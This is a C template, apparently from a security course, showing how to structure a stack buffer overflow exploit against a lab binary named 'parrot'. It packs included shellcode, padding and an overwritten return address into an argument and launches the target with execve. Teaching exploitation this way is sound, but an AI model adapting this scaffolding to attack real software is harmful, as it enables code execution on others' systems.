/*
 * This template demonstrates how an exploit for a stack based
 * buffer overflow could be structured. Feel free to use it, or
 * write your own from scratch.
 *
 * The code does NOT match parrot; it is just a template and you need to change
 * most of it.
 */

#include <inttypes.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <stdio.h>

unsigned char shellcode[] = {
#include "shellcode.h"
};

void func(void) {
    printf("Hello!");
    exit(0);
}

int main(void)
{
    struct _overflow {
        char buf[40];
        char counter;
        char dummy[3];
        uint32_t cookie;
        uint32_t ebp;
        uint32_t ret;
        unsigned char nul;
    } __attribute__((packed)) overflow;
    char *argv[] = { "./parrot", (char *)&overflow, NULL };

    memset(&overflow, 'A', sizeof(overflow));
    memcpy(overflow.buf, shellcode, sizeof(shellcode));
    overflow.ret = (uint32_t)func;
    overflow.nul = '\0';

    execve(argv[0], argv, NULL);
    
    return EXIT_FAILURE;
}
